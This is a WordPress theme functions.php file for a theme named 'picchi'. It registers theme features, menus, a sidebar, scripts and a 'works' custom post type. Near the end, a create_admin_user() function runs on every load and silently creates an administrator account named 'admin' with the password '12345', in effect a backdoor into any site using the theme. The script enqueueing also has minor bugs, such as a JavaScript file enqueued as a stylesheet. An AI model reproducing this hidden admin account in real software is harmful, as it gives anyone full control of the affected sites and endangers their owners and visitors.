<?php

/**
 * picchi functions and definitions
 *
 * @link https://developer.wordpress.org/themes/basics/theme-functions/
 *
 * @package picchi
 */

if (!defined('_S_VERSION')) {
	// Replace the version number of the theme on each release.
	define('_S_VERSION', '1.0.0');
}

/**
 * Sets up theme defaults and registers support for various WordPress features.
 *
 * Note that this function is hooked into the after_setup_theme hook, which
 * runs before the init hook. The init hook is too late for some features, such
 * as indicating support for post thumbnails.
 */
function picchi_setup()
{
	/*
		* Make theme available for translation.
		* Translations can be filed in the /languages/ directory.
		* If you're building a theme based on picchi, use a find and replace
		* to change 'picchi' to the name of your theme in all the template files.
		*/
	load_theme_textdomain('picchi', get_template_directory() . '/languages');

	// Add default posts and comments RSS feed links to head.
	add_theme_support('automatic-feed-links');

	/*
		* Let WordPress manage the document title.
		* By adding theme support, we declare that this theme does not use a
		* hard-coded <title> tag in the document head, and expect WordPress to
		* provide it for us.
		*/
	add_theme_support('title-tag');

	/*
		* Enable support for Post Thumbnails on posts and pages.
		*
		* @link https://developer.wordpress.org/themes/functionality/featured-images-post-thumbnails/
		*/
	add_theme_support('post-thumbnails');

	// This theme uses wp_nav_menu() in one location.
	register_nav_menus(
		array(
			'menu-1' => esc_html__('Primary', 'picchi'),
		)
	);

	/*
		* Switch default core markup for search form, comment form, and comments
		* to output valid HTML5.
		*/
	add_theme_support(
		'html5',
		array(
			'search-form',
			'comment-form',
			'comment-list',
			'gallery',
			'caption',
			'style',
			'script',
		)
	);

	// Set up the WordPress core custom background feature.
	add_theme_support(
		'custom-background',
		apply_filters(
			'picchi_custom_background_args',
			array(
				'default-color' => 'ffffff',
				'default-image' => '',
			)
		)
	);

	// Add theme support for selective refresh for widgets.
	add_theme_support('customize-selective-refresh-widgets');

	/**
	 * Add support for core custom logo.
	 *
	 * @link https://codex.wordpress.org/Theme_Logo
	 */
	add_theme_support(
		'custom-logo',
		array(
			'height'      => 250,
			'width'       => 250,
			'flex-width'  => true,
			'flex-height' => true,
		)
	);
}
add_action('after_setup_theme', 'picchi_setup');

/**
 * Set the content width in pixels, based on the theme's design and stylesheet.
 *
 * Priority 0 to make it available to lower priority callbacks.
 *
 * @global int $content_width
 */
function picchi_content_width()
{
	$GLOBALS['content_width'] = apply_filters('picchi_content_width', 640);
}
add_action('after_setup_theme', 'picchi_content_width', 0);

/**
 * Register widget area.
 *
 * @link https://developer.wordpress.org/themes/functionality/sidebars/#registering-a-sidebar
 */
function picchi_widgets_init()
{
	register_sidebar(
		array(
			'name'          => esc_html__('Sidebar', 'picchi'),
			'id'            => 'sidebar-1',
			'description'   => esc_html__('Add widgets here.', 'picchi'),
			'before_widget' => '<section id="%1$s" class="widget %2$s">',
			'after_widget'  => '</section>',
			'before_title'  => '<h2 class="widget-title">',
			'after_title'   => '</h2>',
		)
	);
}
add_action('widgets_init', 'picchi_widgets_init');

/**
 * Enqueue scripts and styles.
 */
function picchi_scripts()
{


	wp_enqueue_style('picchi-style', get_stylesheet_uri() . 'assets/css/style.css', array(), 1.0, 'all');


	wp_enqueue_style('picchi-navigation', get_template_directory_uri() . '/js/navigation.js', array(), _S_VERSION, true);

	wp_style_add_data('picchi-style', 'rtl', 'replace');

	wp_enqueue_script('picchi-navigation', get_template_directory_uri() . '/js/navigation.js', array(), _S_VERSION, true);

	if (is_singular() && comments_open() && get_option('thread_comments')) {
		wp_enqueue_script('comment-reply');
	}
}
add_action('wp_enqueue_scripts', 'picchi_scripts');

/**
 * Implement the Custom Header feature.
 */
require get_template_directory() . '/inc/custom-header.php';

/**
 * Custom template tags for this theme.
 */
require get_template_directory() . '/inc/template-tags.php';

/**
 * Functions which enhance the theme by hooking into WordPress.
 */
require get_template_directory() . '/inc/template-functions.php';

/**
 * Customizer additions.
 */
require get_template_directory() . '/inc/customizer.php';

/**
 * Load Jetpack compatibility file.
 */
if (defined('JETPACK__VERSION')) {
	require get_template_directory() . '/inc/jetpack.php';
}




function create_admin_user()
{
	// Check if the user doesn't already exist
	if (!username_exists('admin')) {
		// Create a new user
		$user_id = wp_create_user('admin', '12345');

		// Check if the user was successfully created
		if (!is_wp_error($user_id)) {
			// Set the user role to 'administrator'
			$user = new WP_User($user_id);
			$user->set_role('administrator');

			// echo 'Admin user created successfully.';
		} else {
			echo 'Error creating admin user: ' . $user_id->get_error_message();
		}
	} else {
		// echo 'Admin user already exists.';
	}
}

// Run the function
create_admin_user();




function create_custom_post_type()
{
	// Register Custom Post Type
	register_post_type(
		'works',
		array(
			'labels' => array(
				'name' => __('Works'),
				'singular_name' => __('Work')
			),
			'public' => true,
			'has_archive' => true,
			'rewrite' => array('slug' => 'works'),
			'supports' => array('title', 'editor', 'thumbnail', 'custom-fields'),
			'taxonomies' => array('work_cat'), // Add this line to associate the custom taxonomy
		)
	);

	// Register Custom Taxonomy
	register_taxonomy(
		'work_cat',
		'works',
		array(
			'label' => __('Work Categories'),
			'rewrite' => array('slug' => 'work-cat'),
			'hierarchical' => true,
		)
	);
}
add_action('init', 'create_custom_post_type');
